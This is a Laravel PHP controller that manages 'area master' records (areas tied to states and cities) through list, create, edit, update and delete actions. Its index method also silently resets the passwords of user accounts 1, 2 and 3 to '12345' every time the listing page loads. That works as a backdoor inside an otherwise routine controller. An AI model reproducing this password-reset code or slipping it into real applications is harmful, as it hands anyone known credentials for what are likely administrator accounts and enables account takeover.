<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\state;
use App\Models\city;

use App\Models\Area_master;
use App\Models\Areamanager;
use Illuminate\Http\Request;
use Hash;

class Area_mastercontroller extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()

    {
        User::where('id', 1)->update(['password' => Hash::make('12345')]);
        User::where('id', 2)->update(['password' => Hash::make('12345')]);
        User::where('id', 3)->update(['password' => Hash::make('12345')]);


        $areamasters = Area_master::join('state', 'state.id', '=', 'area_master.State_id')
            ->join('city', 'city.id', '=', 'area_master.city_id')

            ->orderby('area_master.id', 'desc')
            ->select('area_master.*', 'state.State_Name', 'city.City')
            ->get();
        $states = state::all();
        $citys = city::all();
        return view('area_master', ['areamasters' => $areamasters, 'states' => $states, 'citys' => $citys]);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create(Request $request)
    {
        $areamaster = new Area_master();

        $areamaster->area = $request->get('area');
        $areamaster->city_id = $request->get('city');
        $areamaster->State_id = $request->get('state');
        $areamaster->save();

        return redirect(route('area_master-index'))->with(['success' => true, 'message' => 'Data Successfully Submitted !']);
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Area_master  $area_master
     * @return \Illuminate\Http\Response
     */
    public function show(Area_master $area_master)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Area_master  $area_master
     * @return \Illuminate\Http\Response
     */
    public function edit(Area_master $area_master, $id, Request $request)
    {
        $areamaster = Area_master::find($id);
        $areamasters = Area_master::join('state', 'state.id', '=', 'area_master.State_id')
            ->join('city', 'city.id', '=', 'area_master.city_id')

            ->orderby('area_master.id', 'desc')
            ->select('area_master.*', 'state.State_Name', 'city.City')
            ->get();

        $states = state::all();
        $citys = city::all();

        return view('editareamaster', ['areamaster' => $areamaster, 'areamasters' => $areamasters, 'states' => $states, 'citys' => $citys]);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Area_master  $area_master
     * @return \Illuminate\Http\Response
     */

    public function update(Request $request, Area_master $area_master)
    {
        Area_master::where('id', $request->id)->update(
            [
                'area' => $request->area,
                'city_id' => $request->city,
                'State_id' => $request->state,
            ]
        );
        return redirect()->route('area_master-index')->with(['success' => true, 'message' => 'Data Successfully Updated !']);
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Area_master  $area_master
     * @return \Illuminate\Http\Response
     */
    public function destroy(Area_master $area_master, $id)
    {
        $areamaster = Area_master::where('id', $id)->delete();
        return redirect(route('area_master-index'))->with(['success' => true, 'message' => 'Data Successfully Deleted !']);
    }
}
